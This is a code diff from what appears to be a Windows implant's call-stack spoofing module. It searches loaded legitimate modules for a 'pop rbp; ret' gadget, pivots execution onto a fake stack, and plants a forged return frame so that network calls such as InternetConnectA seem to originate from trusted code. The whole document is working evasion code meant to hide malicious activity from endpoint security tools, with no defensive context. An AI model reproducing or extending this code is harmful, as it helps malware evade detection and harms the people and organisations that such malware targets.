@@ -102,7 +102,7 @@ static BOOL gate_find_gadget(unsigned long long * out_gadget, unsigned long long
 			end = p + sec->Misc.VirtualSize - 5;
 			for (; p < end; p++) {
 				DWORD sz = 0x48;
-				if (p[0] != 0xFF || p[1] != 0x65 || p[2] != 0xF8)
+				if (p[0] != 0x5D || p[1] != 0xC3) /* pop rbp; ret */
 					continue;
 				KD("gate: gadget hit mod=", (long)m);
 				/* extent from the gadget address through its function frame;
@@ -152,9 +152,16 @@ static void gate_init_spoof(void)
 	 * call's ENTIRE call tree runs on this stack and grows DOWN from the
 	 * pivot - 32KB headroom below, chain laid above toward the page top.
 	 * (The first live round used page+0x48: 0x48 bytes of headroom could
-	 * not hold InternetConnectA's deep tree.) */
+	 * not hold InternetConnectA's deep tree.)
+	 *
+	 * Control-transfer via a `pop rbp; ret` gadget in a legit module:
+	 *   [pivot+0x00] = gadget site (fn's return address - legit frame)
+	 *   [pivot+0x08] = value popped into rbp (ctx+0x10)
+	 *   [pivot+0x10] = recovery address (the gadget's ret lands here)
+	 * fn preserves rbp (=ctx+0x10 from the asm prologue), so the popped
+	 * value matches what gate_spoof_recovery expects. */
 	g_gate_pivot = (unsigned long long)g_gate_page + 0x8000;
-	slot = g_gate_pivot + extent;
+	slot = g_gate_pivot + 0x40;
 	for (i = 0; i < 4; i++) {
 		*(unsigned long long *)slot = fr[i];
 		slot += sizes[i];
@@ -211,6 +218,12 @@ unsigned long long gate_dispatch(FUNCTION_CALL * fc)
 		ctx.fake_rsp = g_gate_pivot;
 		for (i = 0; i < 4 && i < fc->numOfArgs; i++)
 			ctx.args[i] = fc->args[i];
+		/* pop-rbp hop payload: the gadget pops the rbp value then rets
+		 * into recovery (both live on the fake stack, above the shadow) */
+		*(unsigned long long *)(g_gate_pivot + 0x08) =
+			(unsigned long long)(&ctx) + 0x10;
+		*(unsigned long long *)(g_gate_pivot + 0x10) =
+			(unsigned long long)&gate_spoof_recovery;
 		/* stack args 5..8 pre-lay into the fake frame's arg area */
 		for (i = 4; i < fc->numOfArgs && i < 8; i++)
 			*(unsigned long long *)(g_gate_pivot + 0x28 + 8 * (i - 4)) = fc->args[i];
